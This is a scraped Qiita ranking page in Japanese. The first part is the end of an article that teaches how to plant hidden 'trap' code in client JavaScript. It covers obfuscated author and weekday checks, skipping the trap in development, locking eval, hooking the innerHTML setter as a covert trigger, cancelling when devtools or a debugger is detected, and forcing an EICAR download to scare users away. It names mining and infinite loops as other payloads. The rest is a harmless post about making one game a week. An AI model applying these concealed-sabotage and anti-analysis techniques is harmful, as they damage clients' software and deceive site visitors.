class="o">&lt;&lt;</span><span class="mi">15</span><span class="p">;</span><span class="k">return</span> <span class="nx">a</span><span class="o">==</span><span class="nx">e</span><span class="p">}</span><span class="nx">test</span><span class="p">(</span><span class="nx">author</span><span class="p">,</span><span class="o">-</span><span class="mi">658575506</span><span class="p">);</span>
</pre></div></div>

<p>このコードだと、authorの値が<code>"Ore Ore Inc."</code>であるか比較しているようには見えにくくなります。このコードに似たものをすでに実戦投入しています。このコードをfalseを取り出すためだけに一部業務ロジックで利用すると、確実に消せないコードになります。</p>

<h1>
<span id="開発環境で発生させないようにする追記" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%81%A7%E7%99%BA%E7%94%9F%E3%81%95%E3%81%9B%E3%81%AA%E3%81%84%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>開発環境で発生させないようにする(追記)</h1>

<p>URLがlocalhostだったりIPアドレスだったりポート番号が80以外の場合には無視するというのも有効です。この場合「開発環境では問題ない」を実現しやすくなります。</p>

<h1>
<span id="曜日判定の隠蔽追記" class="fragment"></span><a href="#%E6%9B%9C%E6%97%A5%E5%88%A4%E5%AE%9A%E3%81%AE%E9%9A%A0%E8%94%BD%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>曜日判定の隠蔽(追記)</h1>

<p>普通に<code>new Date().getDay()</code>を実行して判定するとバレバレであるため、</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="c1">//土日判定(JST)</span>
<span class="k">if</span><span class="p">((</span><span class="nb">Date</span><span class="p">[</span><span class="mi">30704</span><span class="p">..</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">)]()</span> <span class="o">/</span> <span class="mi">864</span><span class="nx">e5</span> <span class="o">-</span> <span class="mf">1.625</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
    <span class="c1">//バグってたので修正</span>
    <span class="c1">//土日(JST)の場合のみ、左辺が0か1になる。</span>
    <span class="c1">//月曜日は2にになるのでこれで判定が可能。</span>
<span class="p">}</span>
</pre></div></div>

<p>こんな感じのコードすると一見何をやっているかわからない感じになります。</p>

<h1>
<span id="evalの保護追記" class="fragment"></span><a href="#eval%E3%81%AE%E4%BF%9D%E8%AD%B7%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>evalの保護(追記)</h1>

<p><code>window.eval = console.log</code>を実行されると、<code>eval</code>部分でソースが出力されてしまいます。evalの書き換え前に実行できるのであれば、</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">window</span><span class="p">,</span> <span class="s2">"eval"</span><span class="p">,</span> <span class="p">{</span>
    <span class="nx">configurable</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
    <span class="nx">writable</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
    <span class="nx">value</span> <span class="o">:</span> <span class="nb">eval</span><span class="p">,</span>
<span class="p">})</span>
</pre></div></div>

<p>これで保護しましょう。また、もしevalが書き換えられた場合は、</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="c1">//evalが関数かつnativeなeval関数であることを確認して実行</span>
<span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nb">eval</span> <span class="o">==</span> <span class="s2">"function"</span> <span class="o">&amp;&amp;</span> <span class="nb">eval</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">==</span> <span class="s2">"function eval() { [native code] }"</span><span class="p">){</span>
    <span class="nb">eval</span><span class="p">(</span><span class="nx">ソース</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>のようなコードで難読化されたコードが露見できないようにできます。<br>
このコード自体も独自の難読化はしておきましょう。</p>

<h1>
<span id="普通のdom操作に見える処理を利用してフックしてトリガー追記" class="fragment"></span><a href="#%E6%99%AE%E9%80%9A%E3%81%AEdom%E6%93%8D%E4%BD%9C%E3%81%AB%E8%A6%8B%E3%81%88%E3%82%8B%E5%87%A6%E7%90%86%E3%82%92%E5%88%A9%E7%94%A8%E3%81%97%E3%81%A6%E3%83%95%E3%83%83%E3%82%AF%E3%81%97%E3%81%A6%E3%83%88%E3%83%AA%E3%82%AC%E3%83%BC%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>普通のDOM操作に見える処理を利用してフックしてトリガー(追記)</h1>

<p>どう見ても普通のDOM操作に見える以下の処理ですが、innerHTMLの処理を書き換えることで、例えば"bad"を代入するとそれをトリガーに何かをすることができます。</p>

<p>書き換え処理は予め別の場所で仕込んでおいて、innerHTMLへの代入は全然違うところで行うと隠蔽がしやすくなります。</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">xxx</span> <span class="o">?</span> <span class="s2">"ok"</span> <span class="o">:</span> <span class="s2">"bad"</span><span class="p">;</span>
</pre></div></div>

<p>以下はinnerHTMLのフック処理</p>

<div class="code-frame" data-lang="JavaScript"><div class="highlight"><pre><span></span><span class="c1">//ElementのinnerHTMLアクセッサを取得</span>
<span class="kd">var</span> <span class="nx">innerHTML</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyDescriptor</span><span class="p">(</span><span class="nx">Element</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span> <span class="s2">"innerHTML"</span><span class="p">)</span>

<span class="c1">//セッターを取得</span>
<span class="kd">var</span> <span class="nx">originSet</span> <span class="o">=</span> <span class="nx">innerHTML</span><span class="p">.</span><span class="nx">set</span><span class="p">;</span>

<span class="c1">//セッターを書き換え</span>
<span class="nx">innerHTML</span><span class="p">.</span><span class="nx">set</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">string</span><span class="p">){</span>
    <span class="c1">//特定の値の場合をフックして何かする</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">string</span> <span class="o">==</span> <span class="s2">"bad"</span><span class="p">){</span>
        <span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">//オリジナル処理を実行</span>
    <span class="k">return</span> <span class="nx">originSet</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">string</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">//セッターを設定</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">Element</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span> <span class="s2">"innerHTML"</span><span class="p">,</span> <span class="nx">innerHTML</span><span class="p">);</span>
</pre></div></div>

<h1>
<span id="開発ツールのトラッキング追記" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E3%83%84%E3%83%BC%E3%83%AB%E3%81%AE%E3%83%88%E3%83%A9%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>開発ツールのトラッキング(追記)</h1>

<p>開発ツールが開いていることを検出するスクリプトがあります。開発ツールが開かれたら、トラップを発動させないようにすると、さらに対応しにくくなります。</p>

<p><a href="https://github.com/sindresorhus/devtools-detect" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/sindresorhus/devtools-detect</a></p>

<h1>
<span id="デバッガでアタッチしたのをゆるく検知する追記" class="fragment"></span><a href="#%E3%83%87%E3%83%90%E3%83%83%E3%82%AC%E3%81%A7%E3%82%A2%E3%82%BF%E3%83%83%E3%83%81%E3%81%97%E3%81%9F%E3%81%AE%E3%82%92%E3%82%86%E3%82%8B%E3%81%8F%E6%A4%9C%E7%9F%A5%E3%81%99%E3%82%8B%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>デバッガでアタッチしたのをゆるく検知する(追記)</h1>

<p>問題の動作を確認しようとしてデバッガでアタッチをすると、その間イベントループが停止します。その挙動を利用して、イベントループの時間が一定以上かかった場合はデバッガによるアタッチがあったと判断します。</p>

<p>純粋にたまたまPCが重たいときにはトラップが発動しなくなりますが、トラップが発動するわけではないので、この場合は問題ないと考えます。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">last</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">timer</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">now</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
    <span class="c1">//どう考えても1イベントループで5秒もかかる処理がないのであれば</span>
    <span class="c1">//とりあえず5秒をしきい値に</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">now</span> <span class="o">-</span> <span class="nx">last</span> <span class="o">&gt;</span> <span class="mi">5000</span><span class="p">){</span>
        <span class="c1">//デバッガなどが原因で5秒以上停止があったとする</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"トラップの発動をキャンセルする"</span><span class="p">)</span>
        <span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">timer</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">last</span> <span class="o">=</span> <span class="nx">now</span><span class="p">;</span>
<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
</pre></div></div>

<h1>
<span id="アンチウィルスソフトの検出を誘う追記" class="fragment"></span><a href="#%E3%82%A2%E3%83%B3%E3%83%81%E3%82%A6%E3%82%A3%E3%83%AB%E3%82%B9%E3%82%BD%E3%83%95%E3%83%88%E3%81%AE%E6%A4%9C%E5%87%BA%E3%82%92%E8%AA%98%E3%81%86%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>アンチウィルスソフトの検出を誘う(追記)</h1>

<p>無限ループやビットコインのマイニングの他に、アンチウィルスソフトを反応させることで、ウィルスが仕込まれたサイトだとユーザに誤解させてサイトから離脱させる手段です。</p>

<p>検出テストとしてEICARテストファイルと呼ばれるものがあります。この決められた内容のファイルについて、アンチウィルスソフトは必ず検出できなければならないとあります。</p>

<p><a href="https://ja.wikipedia.org/wiki/EICAR%E3%83%86%E3%82%B9%E3%83%88%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB" class="autolink" rel="nofollow noopener" target="_blank">https://ja.wikipedia.org/wiki/EICAR%E3%83%86%E3%82%B9%E3%83%88%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB</a></p>

<p>このファイルと同等な内容を返すURLは以下のとおりです。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>data:application/octet-stream;base64,WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=
</pre></div></div>

<p>以下のようなコードでダウンロードさせることもできます。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="c1">//クロスブラウザ対応コードではないので調整してください</span>
<span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"a"</span><span class="p">);</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">download</span> <span class="o">=</span> <span class="s2">"eicar.com"</span><span class="p">;</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">"data:....."</span><span class="p">;</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">click</span><span class="p">();</span>
</pre></div></div>

<p>環境によってはアンチウィルスソフトが「ウィルスを検出しました！」と表示されます。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">3位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>841</kbd>
		<a target="_blank" href="https://qiita.com/2dgames_jp/items/6a23207fd0057df92552">15週間でクソゲーを20本作って得たもの</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-02<br />09:39:34</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/43772.html">2dgames_jp</a>(44件の記事)<br />(2dgames.jp 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/43772/profile-images/1473689645">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[ゲーム開発]</b> <b>[Game-A-Week]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>※この記事は <a href="http://d.hatena.ne.jp/izmktr/20161220/1482231600" rel="nofollow noopener" target="_blank">ゲームの修羅場14</a> に投稿した記事を加筆・修正した内容となります。</p>

<hr>

<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>15週間(2016/2/4〜5/13)の間、1週間に1つゲーム作る、ということをやっていました。その中でとても貴重な経験が得られたので、それらを紹介したいと思います</p>

<p>なお、作ったゲームは以下のページにまとめています。<br>
* <a href="http://haxeflixel.2dgames.jp/index.php?Product" class="autolink" rel="nofollow noopener" target="_blank">http://haxeflixel.2dgames.jp/index.php?Product</a></p>

<p><a href="https://camo.qiitausercontent.com/2a074c16a5cd5abd1fc9abba3e82671d49bcd8c4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f36653630323663642d643433332d316430302d653236362d3362376232613636326433312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2a074c16a5cd5abd1fc9abba3e82671d49bcd8c4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f36653630323663642d643433332d316430302d653236362d3362376232613636326433312e706e67" alt="Product_-_HaxeFlixel_Wiki.png" title="Product_-_HaxeFlixel_Wiki.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/6e6026cd-d433-1d00-e266-3b7b2a662d31.png"></a></p>

<h1>
<span id="なぜ1週間に1つゲームを作るなどと考えたのか" class="fragment"></span><a href="#%E3%81%AA%E3%81%9C1%E9%80%B1%E9%96%93%E3%81%AB1%E3%81%A4%E3%82%B2%E3%83%BC%E3%83%A0%E3%82%92%E4%BD%9C%E3%82%8B%E3%81%AA%E3%81%A9%E3%81%A8%E8%80%83%E3%81%88%E3%81%9F%E3%81%AE%E3%81%8B"><i class="fa fa-link"></i></a>なぜ「1週間に1つゲームを作る」などと考えたのか</h1>

<p>なぜ「1週間に1つゲームを作る」などと考えたのかというと、数年前からインディーゲーム開発者の中で、ちょっとした話題になっている「Game A Week」というチャレンジに興味があったからです。それと、海外で高い評価を受けているローグライクアクション「Downwell」が「Game A Week」を通して生まれた、ということも気になっていました。そして、ちょうど仕事が暇になったこともあり、挑戦してみることにしました。</p>

<h2>
<span id="game-a-weekとは" class="fragment"></span><a href="#game-a-week%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>Game A Weekとは</h2>

<p>「Game A Week」とは、オランダのインディー系デベロッパー「Vlambeer」のRami Ismail氏が書いた「<a href="https://www.gamasutra.com/blogs/RamiIsmail/20140226/211807/Game_A_Week_Getting_Experienced_At_Failure.php" rel="nofollow noopener" target="_blank">Game A Week: Getting Experienced At Failure</a>」というブログの記事で提唱されたものです。<br>
これは <strong>1週間に1つゲームを作って、ゲーム開発者としての経験値を上げよう</strong> というものです。要は、48時間で1つゲームを作る「Ludum Dare」「Global Game Jam」を長期的に行うようなものです。2ちゃんねるの「おまえら土日までに一本ゲーム作るスレ」も近いといえるかもしれません。<br>
それはさておき、Rami Ismail氏によると、「Game A Week」をするなら以下のルールを守ると効果的だよ、と言っています。</p>

<table>
<thead>
<tr>
<th>ルール</th>
<th>詳細</th>
</tr>
</thead>
<tbody>
<tr>
<td>1. 毎週ゲームを作る</td>
<td>月曜日の12:00にプロジェクトを開始し、日曜日の23:59までにゲームを作り上げること</td>
</tr>
<tr>
<td>2. 毎週ゲームをリリースする</td>
<td>作ったものは例えクソゲーでもWebサイトを通じて配信を行うこと。さらにSNSやブログなどでそれを告知すること</td>
</tr>
<tr>
<td>3. 作り終えたゲームは修正しない</td>
<td>ゲーム完成後は手を入れてはダメ。どうしても修正したい場合は Game A Week 終了後に行うこと</td>
</tr>
<tr>
<td>4. パターン化を避ける</td>
<td>毎週、異なることにチャレンジすること。例えばデジタルゲームを作る代わりにアナログゲームを作る、アクションゲームではなくパズルゲームを作る、など</td>
</tr>
<tr>
<td>5. 振り返りを行う</td>
<td>作って良かったところ、間違っていたところ、興味深かったところ、などをまとめておきます。作ったゲームは何人かにプレイしてもらい感想を聞くこと。そしてその感想をまとめておくこと</td>
</tr>
</tbody>
</table>

<p>5の「振り返り」は以下の項目を検討しておくと良いです。</p>

<ol>
<li>
<strong>Idea</strong>：アイデア。コンセプト。テーマ。元ネタ</li>
<li>
<strong>What went right</strong>：やってみて良かったこと。うまくいったところ。成功したところ。次回に生かせそうなこと</li>
<li>
<strong>What went wrong</strong>：ダメだったところ。うまく機能しなかったところ。問題点。改善すべき点</li>
<li>
<strong>What I learned</strong>：学んだこと。効果的なゲームデザインの方法やツールの使い方、獲得したテクニックなど</li>
</ol>

<p>ちなみに最初にリンクを貼った、作ったゲームの各ページの下の方には、振り返りや作成にかかった時間などを記載しています（以下はノンフィールドRPG「OneWay RPG」を作った時の振り返り)</p>

<p><a href="https://camo.qiitausercontent.com/c523f36abdc8a06f88eb2ce96dd2482c846fec7d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f65306434396431332d383537342d303761352d613133342d6638613563333564303738662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c523f36abdc8a06f88eb2ce96dd2482c846fec7d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f65306434396431332d383537342d303761352d613133342d6638613563333564303738662e706e67" alt="Product_OneWayRPG_-_HaxeFlixel_Wiki.png" title="Product_OneWayRPG_-_HaxeFlixel_Wiki.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/e0d49d13-8574-07a5-a134-f8a5c35d078f.png"></a></p>

<h2>
<span id="game-a-weekで得たもの" class="fragment"></span><a href="#game-a-week%E3%81%A7%E5%BE%97%E3%81%9F%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>Game A Weekで得たもの</h2>

<p>ということで「Game A Week」を行った結果、私が得たものです。</p>

<ol>
<li>ゲームを作りながら技術検証できる</li>
<li>ゲームを完成させたときの達成感を繰り返し得られる</li>
<li>ため込んでいたアイデアをはき出せる</li>
</ol>

<p>人によって得られるものは異なると思いますが、私はこの3つが大きかったと感じました。それぞれを細かく説明していきます。</p>

<h3>
<span id="1-ゲームを作りながら技術検証できる" class="fragment"></span><a href="#1-%E3%82%B2%E3%83%BC%E3%83%A0%E3%82%92%E4%BD%9C%E3%82%8A%E3%81%AA%E3%81%8C%E3%82%89%E6%8A%80%E8%A1%93%E6%A4%9C%E8%A8%BC%E3%81%A7%E3%81%8D%E3%82%8B"><i class="fa fa-link"></i></a>1. ゲームを作りながら技術検証できる</h3>

<p>ゲームを作るには、開発環境で何ができるのか、何が得意なのかを知る必要があります。UnityやUnreal Engineなどのゲームエンジンを使うにしても、いきなり自分の作りたいゲームが作れることはなく、そのゲームエンジンでゲームを作るための方法を学ぶ必要があります。そういった技術検証は、ゲームを作りながら必要な機能を調べる、というやり方が無駄がなく、作りたいものを作るための知識を比較的効率よく学べると思っています。</p>

<p>私の場合は、ゲーム開発環境として「HaxeFlixel」というゲームライブラリを採用しました。しかし、この開発環境は日本ではとてもマイナーな存在で、日本語情報がほとんどありません。なので、ゲームを作りながら何ができるのかを実験しました。HaxeFlixelは、2D横スクロールのジャンプアクションのサンプルデモが充実していて、そのジャンルが得意そうだったので、まずはそれを作ることにしました。<br>
一番最初に作ったのは、「Basement Shooter」というオーソドックスなジャンプアクションで、ゲームデザインを深く考えずに作ったため、つまらないゲームになりました。</p>

<p><a href="https://camo.qiitausercontent.com/2ef4cb34578843e7809d3ba4dd0b885ff9689b7b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f36643931623264362d353466612d643335312d303733622d6637653063383532643830362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2ef4cb34578843e7809d3ba4dd0b885ff9689b7b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f36643931623264362d353466612d643335312d303733622d6637653063383532643830362e706e67" alt="BasementShooter.png" title="BasementShooter.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/6d91b2d6-54fa-d351-073b-f7e0c852d806.png"></a></p>

<p>しかし、ライブラリが用意しているタイルマップ描画や、地形との当たり判定が簡単にできることなど、HaxeFlixelの機能を大まかに理解することができました。</p>

<p>次に作った「Basement Shooter2」はシューティング要素強めのジャンプアクションです。</p>

<p><a href="https://camo.qiitausercontent.com/9be94dfb297d3592004cd09993c112e287585849/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f33613465333736632d306437332d613362652d303632362d3939363637646639353733322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9be94dfb297d3592004cd09993c112e287585849/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f33613465333736632d306437332d613362652d303632362d3939363637646639353733322e706e67" alt="BasementShooter2.png" title="BasementShooter2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/3a4e376c-0d73-a3be-0626-99667df95732.png"></a></p>

<p>敵のAIをStrategyパターンで実装してみたりと技術的な挑戦もあったのですが、ジャンプ要素がないシューティング的な文法でデザインしたため失敗作となりました。この手のゲームを作るのであれば、魂斗羅やガンスターヒーローズを参考にするべきだった、と反省しています。あとAIはプログラムに直接書くよりもスクリプトでデータ化するべきだったように思います。</p>

<p>とまあ、最初の2つのゲームが気合いを入れて作ったのにも関わらずクソゲーだったので、次はできるだけシンプルに作ろうと思い、脱出アクションの「Room666」、キャラクター切り替えパズルアクション「TwinFlip」を作りました。</p>

<p><a href="https://camo.qiitausercontent.com/9668ce4e2ca8ec1aef8e224b10c17e9ab6d90bc8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f32323038396236302d333965382d653531642d323333322d3933663534333161633437352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9668ce4e2ca8ec1aef8e224b10c17e9ab6d90bc8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f32323038396236302d333965382d653531642d323333322d3933663534333161633437352e706e67" alt="room666.png" title="room666.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/22089b60-39e8-e51d-2332-93f5431ac475.png"></a>　<a href="https://camo.qiitausercontent.com/b49f8afb9c338d26a97e9f5fb0a008bd2cfc87e6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f62656135336438342d383863382d396364612d376434662d3633393837386330626438312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b49f8afb9c338d26a97e9f5fb0a008bd2cfc87e6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f62656135336438342d383863382d396364612d376434662d3633393837386330626438312e706e67" alt="TwinFlip.png" title="TwinFlip.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/bea53d84-88c8-9cda-7d4f-639878c0bd81.png"></a></p>

<p>前の2つが「面白いゲームを作ってやろう」と意気込んで作ったのに対し、これらは肩の力を抜いて作れたので、そこそこ面白いゲームとなりました。</p>

<p>ここから得られたものとして、 <strong>技術が積み重なると、ゲームデザインに余裕が生まれ、面白いゲームが作りやすくなる</strong> ということを強く実感しました。ここで言う技術とは、プログラムの技術もありますし、ゲームデザインに対する理解も含みます。2Dジャンプアクションを4つ作ったことで、それに対する理解が深まったように感じています。私のゲーム制作のスタイルとして、念入りに脳内でゲームデザインを検証したりするタイプではなく、とりあえず作って試す、といった脳筋スタイルのため、Game A Week は相性が良かったように思います。</p>

<p>そしてその後も、「Hell Ball」というビリヤードゲームを作って物理エンジンの使い方を学びました。また「Flappy Shooter」 というシューティングゲームでは、自作のスクリプト言語を、初めて敵のAIに使用して、問題なく動くことが確認できました。<br>
<a href="https://camo.qiitausercontent.com/c3b16b28013f68c0b2a7ab4d15bbdadd1dd7f7a5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f34396464323531322d313437662d396239632d363136622d3632336439383838653166612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c3b16b28013f68c0b2a7ab4d15bbdadd1dd7f7a5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f34396464323531322d313437662d396239632d363136622d3632336439383838653166612e706e67" alt="HellBall.png" title="HellBall.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/49dd2512-147f-9b9c-616b-623d9888e1fa.png"></a>　<a href="https://camo.qiitausercontent.com/e3fc6d0c2e7fe88605e33a945695787b04f82cbe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f35336537323136342d323961352d353432632d656436352d6236303162303561393865652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e3fc6d0c2e7fe88605e33a945695787b04f82cbe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f35336537323136342d323961352d353432632d656436352d6236303162303561393865652e706e67" alt="FlappyShooter.png" title="FlappyShooter.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/53e72164-29a5-542c-ed65-b601b05a98ee.png"></a></p>

<p>また「One Way RPG」というノンフィールドRPGを作ったときには、静的データベースであるCastleDBを導入して、このツールの使い方とアプリケーションでの読み込み方法を調査し、簡単に使うためのモジュールの作成を行いました。また、RPGはユーザーインターフェイスを効率よく作ることが重要なので、HaxeFlixelが持つGUIライブラリを使って、XMLで記述したGUIのレイアウトデータを読み込んで配置できるようにしました。</p>

<p><a href="https://camo.qiitausercontent.com/908cd07b73cc47ff4c706950073ff60e78b625a8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f39366235383062352d373637392d393234372d623965622d6262313130366139326539372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/908cd07b73cc47ff4c706950073ff60e78b625a8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f39366235383062352d373637392d393234372d623965622d6262313130366139326539372e706e67" alt="OneWayRPG.png" title="OneWayRPG.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/96b580b5-7679-9247-b9eb-bb1106a92e97.png"></a></p>

<p>その他にもステルス系ゲームを作った際には、プレイヤーが敵の視界内に存在するかどうかのアルゴリズムを実装したり、レーザーを撃つゲームを作った際には線分と矩形の交差判定を実装して、自作のライブラリへ組み込み、汎用的に使えるようにしました。</p>

<p><a href="https://camo.qiitausercontent.com/e01451d2aac1d4cd0b8f651f204fb43369193b77/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f64336466333132342d303062352d363164632d613365332d6463336635303033656637342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e01451d2aac1d4cd0b8f651f204fb43369193b77/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f64336466333132342d303062352d363164632d613365332d6463336635303033656637342e706e67" alt="HyperSneakingMission.png" title="HyperSneakingMission.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/43772/d3df3124-00b5-61dc-a3e3-dc3f5003ef74.png"></a>　<a href="https://camo.qiitausercontent.com/58da323c40ef70732441999aa6d5bd8191e4a301/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f39626434633232642d666666622d616161342d623466622d6434623336623963383036342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/58da323c40ef70732441999aa6d5bd8191e4a301/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34333737322f39626434633232642d666666622d616161342d623466622d6434623336623963383036342e706e67" alt="LaserBeam.png" title="LaserBeam.png" 